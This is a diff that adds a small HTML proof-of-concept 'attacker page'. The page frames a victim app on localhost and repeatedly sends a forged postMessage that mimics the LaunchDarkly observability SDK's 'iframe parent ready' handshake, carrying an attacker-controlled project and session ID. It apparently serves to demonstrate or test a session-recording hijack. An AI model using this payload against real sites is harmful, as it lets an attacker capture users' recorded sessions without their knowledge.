@@ -1,0 +1,34 @@
+<!doctype html>
+<html>
+	<head>
+		<meta charset="utf-8" />
+		<title>Attacker page — embeds the victim app</title>
+	</head>
+	<body>
+		<h1>An unrelated page that happens to frame the victim app</h1>
+		<iframe id="victim" src="http://localhost:9341/" width="800" height="400"></iframe>
+		<script>
+			var mode = new URLSearchParams(window.location.search).get('mode')
+			var frame = document.getElementById('victim')
+
+			if (mode !== 'quiet') {
+				// One message shape is all it takes. The sentinel string and
+				// the message fields come from the SDK's own published bundle
+				// (client/types/iframe.ts in launchdarkly/observability-sdk).
+				// The session ID below is the attacker's own value — the
+				// attacker's page needs no SDK and no account beyond a free
+				// project to point at.
+				var payload = {
+					highlight: 'iframe parent ready',
+					projectID: 666001,
+					sessionSecureID: 'ATTACKER-CONTROLLED-SESSION-4dc1e2'
+				}
+				setInterval(function () {
+					try {
+						frame.contentWindow.postMessage(payload, '*')
+					} catch (e) {}
+				}, 500)
+			}
+		</script>
+	</body>
+</html>
